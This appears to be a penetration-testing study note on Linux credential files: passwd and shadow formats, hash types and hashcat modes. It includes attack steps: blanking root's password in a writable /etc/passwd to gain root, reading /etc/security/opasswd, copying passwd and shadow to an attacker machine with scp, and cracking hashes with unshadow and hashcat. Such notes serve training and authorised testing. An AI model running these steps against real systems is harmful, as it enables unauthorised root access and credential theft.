# Linux Credential Storage
**Concept:** Linux separates user metadata (`/etc/passwd`) from actual password hashes (`/etc/shadow`). 
**Goal:** Acquire the `/etc/shadow` file to crack root hashes offline, or modify `/etc/passwd` to remove the root password.
## 1. The Passwd File (`/etc/passwd`)
**Permissions:** Readable by **everyone** (World Readable). Writable only by Root (usually). 
**Format:** `root:x:0:0:root:/root:/bin/bash`

| **Field**      | **Value**       | **Description**                                     |
| ---------- | ----------- | ----------------------------------------------- |
| *Username* | `root`      | Login name.                                     |
| *Password* | `x`         | Placeholder. `x` means "Look in `/etc/shadow`". |
| *UID*      | `0`         | User ID. **0 is always Root.**                  |
| *GID*      | `0`         | Group ID.                                       |
| *Comment*  | `root`      | Metadata (Full Name, Phone).                    |
| *Home*     | `/root`     | User's home directory.                          |
| *Shell*    | `/bin/bash` | Default shell.                                  |
### Vulnerability: Writable `/etc/passwd`
**Scenario:** If you find `/etc/passwd` is writable by your user (Configuration error). 
**Exploit:** Remove the `x`. This tells Linux "This user has no password".
```shell
# 1. Original Line
root:x:0:0:root:/root:/bin/bash

# 2. Modified Line (x removed)
root::0:0:root:/root:/bin/bash

# 3. Elevate
su root
# (Press Enter when prompted for password. You are now Root.)
```
## 2. The Shadow File (`/etc/shadow`)
**Permissions:** Readable only by **Root** (or `shadow` group). 
**Format:** `user:$6$salt$hash:18937:0:99999:7:::`

| **Field**         | **Description**                                              |
| ------------- | -------------------------------------------------------- |
| *Username*    | The login name.                                          |
| *Hash*        | The encrypted password string (e.g., `$6$salt$hash`).    |
| *Last Change* | Days since Epoch (Jan 1, 1970) the password was changed. |
| *Min/Max Age* | Policy limits for password changes.                      |
### Hash Algorithms (The `$id$`)
The prefix tells you how to crack it.

| **ID**   | **Algorithm** | **Notes**                                     | **Hashcat Mode** |
| -------- | ------------- | --------------------------------------------- | ---------------- |
| `$1$`    | *MD5*       | Ancient. Trivially crackable.                 | `500`            |
| `$2a/y$` | *Blowfish*  | (bcrypt). Slow and resistant to GPU cracking. | `3200`           |
| `$5$`    | *SHA-256*   | Stronger, but older standard.                 | `7400`           |
| `$6$`    | *SHA-512*   | **Standard** on modern Linux.                 | `1800`           |
**Special Flags:**
- `*` or `!`: The account is locked or has no password set. (Cannot login via password, but SSH keys might still work).
## 3. The Opasswd File (`/etc/security/opasswd`)
**Role:** Stores **Old Passwords** to enforce history policies (e.g., "You cannot reuse your last 5 passwords"). 
**Value:** Often overlooked. It requires Root to read, but it may contain older hashes encrypted with weaker algorithms (MD5) that are easier to crack than the current SHA-512 hash. 
**Strategy:** Crack the old password (`Summer2021!`) to guess the current one (`Summer2022!`).
```shell
# Read history file
sudo cat /etc/security/opasswd
```
## 4. Cracking Workflow (Unshadow)
**Concept:** `john` and `hashcat` usually need the "Unshadowed" format (combining the username from `passwd` with the hash from `shadow`).
### Step 1: Unshadow (Prepare the Hash)
```shell
# 1. Exfiltrate files to your attacker machine
scp root@target:/etc/passwd .
scp root@target:/etc/shadow .

# 2. Combine them
unshadow passwd shadow > unshadowed.txt
```
### Step 2: Crack (Hashcat)
**Context:** Use your GPU to break the hash.
```shell
# Cracking SHA-512 ($6$) - Modern Linux
# -m 1800: SHA-512
# -a 0: Dictionary Attack
hashcat -m 1800 -a 0 unshadowed.txt /usr/share/wordlists/rockyou.txt -o cracked.txt

# Cracking MD5 ($1$) - Legacy/IoT
hashcat -m 500 -a 0 unshadowed.txt rockyou.txt
```